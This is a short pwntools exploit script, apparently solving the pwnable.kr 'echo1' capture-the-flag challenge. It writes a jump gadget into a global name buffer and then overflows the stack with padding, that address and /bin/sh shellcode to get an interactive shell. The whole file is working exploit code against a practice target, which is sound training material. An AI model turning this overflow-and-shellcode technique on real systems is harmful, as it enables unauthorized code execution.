# encoding: utf-8
import math
import struct
from pwn import *
import sys

if len(sys.argv) != 2:
    log.info("Usage: python solv.py [local|remote]")
    exit()

"""
静的解析
"""
elf = ELF("echo1");

main_addr = p32(elf.sym["main"])
namebuffer_addr = elf.sym["id"]

"""
exploit
"""
context(os="linux", arch="amd64")
context.log_level = 'debug'

if sys.argv[1] == "remote":
    p = remote("pwnable.kr", 9010);
elif sys.argv[1] == "local":
    p = process("./echo1");

#import pdb; pdb.set_trace()

shellcode = shellcraft.amd64.push("rsp")
shellcode += shellcraft.amd64.ret()

namebuffer = asm(shellcode)

shellcode = asm(shellcraft.amd64.linux.sh())

p.recvuntil(" : ")
p.sendline(namebuffer)
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("\n")
#gdb.attach(p)
p.sendline("A"*(0x20+0x08)+p64(namebuffer_addr)+shellcode)
p.interactive()
